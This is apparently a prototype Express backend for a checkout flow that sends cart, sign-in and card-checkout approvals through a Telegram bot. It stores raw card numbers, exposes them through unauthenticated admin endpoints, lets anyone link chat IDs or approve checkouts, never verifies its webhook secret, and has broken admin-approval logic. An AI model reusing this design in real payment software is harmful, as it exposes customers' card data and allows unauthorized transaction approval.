const express = require('express')
const cors = require('cors')
const bodyParser = require('body-parser')
const crypto = require('crypto')
const axios = require('axios')

const app = express()
const PORT = process.env.PORT || 3001

app.use(cors({
  origin: ['http://localhost:3000', 'http://localhost:5173'],
  credentials: true,
}))
app.use(bodyParser.json())

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET

const store = {
  users: new Map(),
  checkouts: {},
  sessions: new Map(),
  cart: {
    items: [
      {
        product: {
          id: 'PRD-001',
          name: 'Wall Paste Repair kit Coating Sealant Agent With Scraper Crack Hole Mending Paste Mildewproof Patch White Wall Restoration',
          price: 12.99,
          image: 'https://ae-pic-a1.aliexpress-media.com/kf/S0b0721e749814123ae9203b340dee9073.jpg',
        },
        quantity: 1,
      },
    ],
  },
  referralBalance: 5.5,
  payments: {},
  authRequests: {},
  adminChatId: '7867527304',
}

const generateId = () => crypto.randomBytes(8).toString('hex')

function sendTelegramMessage(chatId, text, keyboard = null) {
  const payload = { chat_id: chatId, text }
  if (keyboard) payload.reply_markup = keyboard
  return axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, payload)
}

function sendTelegramAction(chatId, action) {
  return axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/${action}`, { chat_id: chatId })
}

app.get('/api/cart', (req, res) => {
  res.json(store.cart)
})

app.get('/api/cart/items/:userId', (req, res) => {
  const { userId } = req.params
  const user = store.users.get(userId)
  if (user && user.lastCartItems) {
    sendTelegramCartNotification(user.telegramChatId, user.lastCartItems)
  }
  res.json({ items: store.cart.items })
})

async function sendTelegramCartNotification(chatId, items) {
  if (!items || items.length === 0) return
  
  const itemText = items.map(i => `• ${i.product?.name || 'Item'} x${i.quantity}`).join('\n')
  const text = `📦 New Item Added to Cart!\n\n${itemText}`
  
  try {
    await sendTelegramMessage(chatId, text)
  } catch (err) {
    console.error('Cart notification failed:', err.message)
  }
}

app.post('/api/cart/add', async (req, res) => {
  const { userId, product, quantity } = req.body
  
  store.cart.items.push({ product, quantity })
  
  if (userId) {
    const user = store.users.get(userId)
    if (user && user.telegramConnected && user.telegramChatId) {
      await sendTelegramCartNotification(user.telegramChatId, store.cart.items)
    }
  }
  
  res.json({ items: store.cart.items })
})

app.get('/api/auth/telegram-link', (req, res) => {
  const { returnUrl } = req.query
  const tempId = `temp_${generateId()}`
  
  res.json({ tempId, returnUrl: `http://localhost:3000/auth/telegram/callback?tempId=${tempId}` })
})

app.post('/api/referrals/balance', (req, res) => {
  res.json({
    walletBalance: store.referralBalance,
    canWithdrawReferralRewards: store.referralBalance > 0,
  })
})

app.get('/api/users/:userId', (req, res) => {
  const { userId } = req.params
  const user = store.users.get(userId) || { 
    id: userId, 
    telegramChatId: null, 
    telegramConnected: false,
    name: 'John Doe',
    email: 'john@example.com'
  }
  res.json(user)
})

app.post('/api/users/:userId/telegram-chat-id', (req, res) => {
  const { userId } = req.params
  const { chatId } = req.body
  
  const existingUser = store.users.get(userId) || { id: userId }
  store.users.set(userId, {
    ...existingUser,
    telegramChatId: String(chatId),
    telegramConnected: true,
  })
  
  res.json({ success: true, telegramConnected: true })
})

app.post('/api/auth/signin', async (req, res) => {
  const { userId, email } = req.body
  
  if (!BOT_TOKEN) {
    return res.status(500).json({ error: 'Telegram bot token not configured' })
  }
  
  const requestId = `signin_${generateId()}`
  store.authRequests[requestId] = { userId, email, type: 'SIGNIN', status: 'PENDING' }
  
  res.json({ requestId })
})

app.post('/api/auth/register', async (req, res) => {
  const { email, name } = req.body
  
  if (!BOT_TOKEN) {
    return res.status(500).json({ error: 'Telegram bot token not configured' })
  }
  
  const requestId = `register_${generateId()}`
  store.authRequests[requestId] = { email, name, type: 'REGISTER', status: 'PENDING' }
  
  res.json({ requestId })
})

app.post('/api/telegram/webhook', async (req, res) => {
  const update = req.body
  
  try {
    if (update.message && update.message.text) {
      const message = update.message
      const chatId = message.chat.id
      const text = message.text.trim()
      
      if (text.startsWith('/start')) {
        const params = text.split('_')
        const userId = params.length > 1 ? params[1] : null
        const authType = params.length > 2 ? params[2] : 'connect'
        
        if (userId && userId.startsWith('auth_')) {
          const actualUserId = userId.replace('auth_', '')
          store.users.set(actualUserId, {
            ...store.users.get(actualUserId) || { id: actualUserId, name: '', email: '' },
            telegramChatId: String(chatId),
            telegramConnected: true,
          })
          
          await sendTelegramMessage(chatId, 
            authType === 'signin' 
              ? '✅ Sign in requested! An admin will approve shortly.\n\nGo back to the website to complete sign in.'
              : authType === 'register'
              ? '✅ Registration requested! An admin will approve shortly.\n\nGo back to the website to complete registration.'
              : '✅ Telegram connected! Approve checkouts directly from here.'
          )
        } else if (userId) {
          const user = store.users.get(userId)
          if (user) {
            user.telegramChatId = String(chatId)
            user.telegramConnected = true
            store.users.set(userId, user)
            await sendTelegramMessage(chatId, '✅ Telegram connected to your account!')
          }
        }
      }
    }
    
    if (update.callback_query) {
      const callbackQuery = update.callback_query
      const callbackId = callbackQuery.id
      const chatId = callbackQuery.from.id
      const data = callbackQuery.data
      
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: callbackId,
      })
      
      if (data === 'approve_cart') {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: '✅ Item added to cart!',
        })
      } else if (data === 'approve_signin') {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: '✅ Sign in approved! User can now sign in.',
        })
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: store.adminChatId,
          text: `📋 Sign in approval: ${chatId} wants to sign in`,
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Approve', callback_data: 'signin_approve' },
              { text: '❌ Reject', callback_data: 'signin_reject' }
            ]]
          }
        })
      } else if (data === 'approve_register') {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: '✅ Registration approved! User can now register.',
        })
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: store.adminChatId,
          text: `📋 Registration approval: ${chatId} wants to register`,
          reply_markup: {
            inline_keyboard: [[
              { text: '✅ Approve', callback_data: 'register_approve' },
              { text: '❌ Reject', callback_data: 'register_reject' }
            ]]
          }
        })
      }
      
      if (update.callback_query.data.startsWith('approve_') || update.callback_query.data.startsWith('reject_')) {
        const checkoutId = update.callback_query.data.replace(/approve_|reject_/, '')
        const isAdmin = [store.adminChatId]?.includes(chatId)
        
        if (isAdmin) {
          await handleAdminApproval(checkoutId, chatId, update.callback_query.data)
        } else {
          await handleTelegramApproval(checkoutId, chatId)
        }
      }
    }
    
    res.json({ ok: true })
  } catch (error) {
    console.error('Webhook error:', error.message)
    res.status(500).json({ error: 'Webhook processing failed' })
  }
})

async function handleAdminApproval(checkoutId, adminChatId, action) {
  const checkout = store.checkouts[checkoutId]
  if (!checkout) return
  
  const userChatId = checkout.telegramChatId || checkout.userId
  
  if (action === 'approve_xxx' || action.includes('approve')) {
    checkout.status = 'APPROVED_TELEGRAM'
    checkout.approvedAt = new Date().toISOString()
    checkout.approvedVia = 'telegram'
    checkout.approvedBy = adminChatId
    
    await sendTelegramMessage(userChatId, 
      `✅ Checkout #${checkoutId} approved by admin!\n\nYour order will now be processed.`
    )
  } else {
    checkout.status = 'REJECTED_TELEGRAM'
    checkout.rejectedAt = new Date().toISOString()
    checkout.rejectedVia = 'telegram'
    
    await sendTelegramMessage(userChatId,
      `❌ Checkout #${checkoutId} was rejected by admin.`
    )
  }
}

async function handleTelegramApproval(checkoutId, chatId) {
  const checkout = store.checkouts[checkoutId]
  if (!checkout) return
  
  checkout.status = 'APPROVING_TELEGRAM'
  checkout.approvingAt = new Date().toISOString()
  checkout.approvedVia = 'telegram'
  checkout.approvedBy = chatId
  
  await sendTelegramMessage(chatId, '⏳ Processing approval...')
}

async function handleTelegramRejection(chatId, checkoutId) {
  const checkout = store.checkouts[checkoutId]
  if (checkout) {
    checkout.status = 'REJECTED_TELEGRAM'
    checkout.rejectedAt = new Date().toISOString()
    checkout.rejectedVia = 'telegram'
  }
  
  await sendTelegramMessage(chatId, '❌ Checkout rejected.')
}

app.post('/api/payments/create-intent', (req, res) => {
  const { amount, items } = req.body
  const orderId = `ORD-${Date.now()}-${generateId().slice(0, 8)}`
  const clientSecret = `${orderId}_secret_${generateId().slice(0, 16)}`
  
  store.payments[orderId] = {
    id: orderId,
    amount,
    items,
    status: 'authorized',
    createdAt: new Date().toISOString(),
    clientSecret,
  }
  
  res.json({ clientSecret, orderId })
})

app.post('/api/checkouts', (req, res) => {
  const checkout = req.body
  const checkoutId = `CHX-${Date.now()}-${generateId().slice(0, 8)}`
  
  store.checkouts[checkoutId] = {
    id: checkoutId,
    ...checkout,
    status: 'PENDING',
    createdAt: new Date().toISOString(),
    telegramChatId: checkout.telegramChatId,
  }
  
  if (checkout.userId) {
    const user = store.users.get(checkout.userId)
    if (user && user.telegramConnected && user.telegramChatId) {
      sendTelegramOTP(user.telegramChatId, checkoutId, checkout)
    }
  }
  
  res.json({ success: true, data: { id: checkoutId } })
})

async function sendTelegramOTP(chatId, checkoutId, checkoutData) {
  const cardLast4 = checkoutData.cardNumber?.replace(/\s/g, '').slice(-4) || '****'
  const amount = checkoutData.amount || checkoutData.totalAmount || 12.99
  
  const message = `📥 New Checkout Request
Amount: $${amount}
Card: •••• ${cardLast4}
⏳ Approve to confirm or Reject to cancel`
  
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: chatId,
      text: message,
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⏳ Approving...', callback_data: `status_${checkoutId}` },
            { text: '✅ Approve', callback_data: `approve_${checkoutId}` },
            { text: '❌ Reject', callback_data: `reject_${checkoutId}` }
          ]
        ]
      }
    })
  } catch (err) {
    console.error('Failed to send Telegram message:', err.message)
  }
}

app.post('/api/checkouts/:id/approve-telegram', (req, res) => {
  const { id } = req.params
  const checkout = store.checkouts[id]
  
  if (!checkout) {
    return res.status(404).json({ message: 'Checkout not found' })
  }
  
  checkout.status = 'APPROVED_TELEGRAM'
  checkout.approvedAt = new Date().toISOString()
  checkout.approvedVia = 'telegram'
  
  res.json({ success: true, checkout, status: 'APPROVED_TELEGRAM' })
})

app.post('/api/checkouts/:id/reject-telegram', (req, res) => {
  const { id } = req.params
  const checkout = store.checkouts[id]
  
  if (!checkout) {
    return res.status(404).json({ message: 'Checkout not found' })
  }
  
  checkout.status = 'REJECTED_TELEGRAM'
  checkout.rejectedAt = new Date().toISOString()
  checkout.rejectedVia = 'telegram'
  
  res.json({ success: true, checkout })
})

app.get('/api/admin/checkouts', (req, res) => {
  res.json({
    checkouts: Object.values(store.checkouts),
    signinRequests: Object.values(store.authRequests).filter(a => a.type === 'SIGNIN'),
    registerRequests: Object.values(store.authRequests).filter(a => a.type === 'REGISTER'),
  })
})

app.post('/api/admin/approve-signin/:requestId', (req, res) => {
  const { requestId } = req.params
  const request = store.authRequests[requestId]
  
  if (!request || request.type !== 'SIGNIN') {
    return res.status(404).json({ message: 'Signin request not found' })
  }
  
  request.status = 'APPROVED'
  res.json({ success: true, userId: request.userId })
})

app.post('/api/admin/approve-register/:requestId', (req, res) => {
  const { requestId } = req.params
  const request = store.authRequests[requestId]
  
  if (!request || request.type !== 'REGISTER') {
    return res.status(404).json({ message: 'Register request not found' })
  }
  
  request.status = 'APPROVED'
  res.json({ success: true, email: request.email, name: request.name })
})

app.get('/', (req, res) => {
  res.json({
    message: 'Checkout API Server with Telegram Integration',
    endpoints: [
      'GET /api/cart',
      'GET /api/referrals/balance',
      'GET /api/users/:userId',
      'POST /api/auth/telegram-link',
      'POST /api/auth/signin',
      'POST /api/auth/register',
      'POST /api/cart/add',
      'POST /api/users/:userId/telegram-chat-id',
      'POST /api/telegram/webhook',
      'POST /api/payments/create-intent',
      'POST /api/checkouts',
      'POST /api/checkouts/:id/approve-telegram',
      'POST /api/checkouts/:id/reject-telegram',
      'GET /api/admin/checkouts',
    ],
  })
})

app.listen(PORT, () => {
  console.log(`Checkout API server running on port ${PORT}`)
  console.log(`Telegram Bot Token: ${BOT_TOKEN ? 'Configured' : 'Not set'}`)
})

module.exports = app